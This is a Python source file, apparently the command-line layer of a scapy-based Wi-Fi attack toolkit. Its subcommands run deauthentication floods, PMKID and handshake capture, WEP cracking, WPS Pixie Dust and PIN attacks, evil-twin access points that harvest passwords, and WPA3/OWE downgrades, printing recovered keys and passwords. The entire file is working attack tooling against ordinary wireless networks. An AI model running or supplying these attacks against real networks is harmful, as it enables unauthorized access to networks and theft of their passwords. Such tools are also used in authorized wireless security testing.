"""Native attack subcommands (scapy-based, no external engine wrapping)."""

from __future__ import annotations

import sys

from ..attacks.deauth import deauth
from ..attacks.eviltwin import run_downgrade_twin, run_eviltwin, run_owe_downgrade
from ..attacks.handshake import capture_handshake
from ..attacks.pmkid import capture_pmkid
from ..attacks.wep_crack import crack_wep
from ..attacks.wps import AttemptOutcome, pixie_attempt
from ..frames import BROADCAST
from ..omni import OmniOrchestrator
from ..radio import get_mac
from ..scan import scan
from ..storage import capture_root
from ..wps.oneshot import OneShot, Outcome


def _cmd_deauth(args) -> int:
    sent = deauth(
        args.iface,
        bssid=args.bssid,
        client=args.client or BROADCAST,
        count=args.count,
        channel=args.channel,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    print(f"sent {sent} deauth frames to {args.client or 'broadcast'}")
    return 0


def _cmd_pmkid(args) -> int:
    line = capture_pmkid(
        args.iface, bssid=args.bssid, client=args.client, channel=args.channel,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if line is None:
        print("no PMKID captured", file=sys.stderr)
        return 1
    print(line)
    return 0


def _cmd_handshake(args) -> int:
    cap = capture_handshake(
        args.iface, bssid=args.bssid, channel=args.channel,
        timeout=args.timeout, outfile=args.outfile,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    for (ap, client), msgs in cap.messages.items():
        status = cap.status(ap, client).value
        print(f"{ap} {client}: messages={sorted(msgs)} [{status}]")
    return 0


def _cmd_omni(args) -> int:
    from ..crack.john import JohnCracker, JohnUnavailableError

    result = scan(args.iface, duration=args.profile_duration, channels=[args.channel] if args.channel else None)
    ap = result.aps.get(args.bssid.lower())
    if ap is None:
        print(f"{args.bssid} not seen during {args.profile_duration}s profile scan", file=sys.stderr)
        return 1

    cracker = None
    if args.wordlist:
        try:
            cracker = JohnCracker()
        except JohnUnavailableError as exc:
            print(f"warning: {exc} — will batch hashes but not crack", file=sys.stderr)

    capture_dir = args.capture_dir or str(capture_root())
    orch = OmniOrchestrator(
        args.iface, cracker=cracker, capture_dir=capture_dir,
        progress_fn=lambda msg: print(msg, flush=True),
        iface_ap=args.iface_ap,
    )
    report = orch.run(ap, wordlist=args.wordlist)
    print(report.summary())
    return 0 if report.cracked or not args.wordlist else 1


def _cmd_smart(args) -> int:
    from ..crack.john import JohnCracker, JohnUnavailableError

    result = scan(args.iface, duration=args.profile_duration, channels=[args.channel] if args.channel else None)
    ap = result.aps.get(args.bssid.lower())
    if ap is None:
        print(f"{args.bssid} not seen during {args.profile_duration}s profile scan", file=sys.stderr)
        return 1

    cracker = None
    if args.wordlist:
        try:
            cracker = JohnCracker()
        except JohnUnavailableError as exc:
            print(f"warning: {exc} — will batch hashes but not crack", file=sys.stderr)

    capture_dir = args.capture_dir or str(capture_root())
    orch = OmniOrchestrator(
        args.iface, cracker=cracker, capture_dir=capture_dir,
        progress_fn=lambda msg: print(msg, flush=True),
        iface_ap=args.iface_ap,
    )
    report = orch.run_smart(ap, wordlist=args.wordlist)
    print(report.summary())
    return 0 if report.cracked or not args.wordlist else 1


def _cmd_wep(args) -> int:
    client = get_mac(args.iface)
    key = crack_wep(
        args.iface, args.bssid, client, args.ssid, key_len=args.key_len,
        channel=args.channel, target_sessions=args.target_sessions, timeout=args.timeout,
    )
    if key is None:
        print("no key recovered (timed out or no ARP traffic seen)", file=sys.stderr)
        return 1
    print(key.hex())
    return 0


def _cmd_wps_pixie(args) -> int:
    eapol_versions = tuple(int(v) for v in args.eapol_versions.split(","))
    result = pixie_attempt(
        args.iface, args.bssid, args.ssid, channel=args.channel, msg_timeout=args.timeout,
        eapol_versions=eapol_versions, passive=args.passive,
    )
    if result.outcome is AttemptOutcome.SUCCESS:
        print(f"SUCCESS ssid={result.ssid!r} key={result.network_key!r}")
        return 0
    suffix = f" ({result.detail})" if result.detail else ""
    print(f"failed: {result.outcome.name}{suffix}", file=sys.stderr)
    return 1


def _cmd_wps_oneshot(args) -> int:
    with OneShot(args.iface, bssid=args.bssid, verbose=args.verbose) as shot:
        if args.pbc:
            result = shot.single_connection(args.bssid, pbc_mode=True)
        elif args.pin:
            result = shot.single_connection(args.bssid, pin=args.pin)
        else:
            result = shot.pixie_dust_attack(args.bssid)

    if result.outcome is Outcome.SUCCESS:
        print(f"SUCCESS bssid={result.bssid} ssid={result.ssid!r} pin={result.pin!r} key={result.psk!r}")
        return 0
    suffix = f" ({result.detail})" if result.detail else ""
    print(f"failed: {result.outcome.value}{suffix}", file=sys.stderr)
    return 1


def _cmd_eviltwin(args) -> int:
    result = run_eviltwin(
        iface_ap=args.iface_ap, iface_mon=args.iface_mon,
        bssid=args.bssid, ssid=args.ssid, channel=args.channel,
        timeout=args.timeout,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if result.success:
        print(f"SUCCESS: password captured -> {result.password!r}")
        return 0
    print(f"failed: {result.detail}", file=sys.stderr)
    return 1


def _cmd_downgrade_twin(args) -> int:
    result = run_downgrade_twin(
        iface_ap=args.iface_ap, iface_mon=args.iface_mon,
        bssid=args.bssid, ssid=args.ssid, channel=args.channel,
        outfile=args.outfile, timeout=args.timeout,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if result.status.value != "none":
        print(f"{result.detail}")
        return 0
    print(f"failed: {result.detail}", file=sys.stderr)
    return 1


def _cmd_owe_downgrade(args) -> int:
    result = run_owe_downgrade(
        iface_ap=args.iface_ap, iface_mon=args.iface_mon,
        owe_bssid=args.owe_bssid, open_ssid=args.open_ssid, channel=args.channel,
        timeout=args.timeout,
        progress_fn=lambda msg: print(msg, flush=True),
    )
    if result.success:
        print(f"SUCCESS: {result.detail}")
        return 0
    print(f"failed: {result.detail}", file=sys.stderr)
    return 1
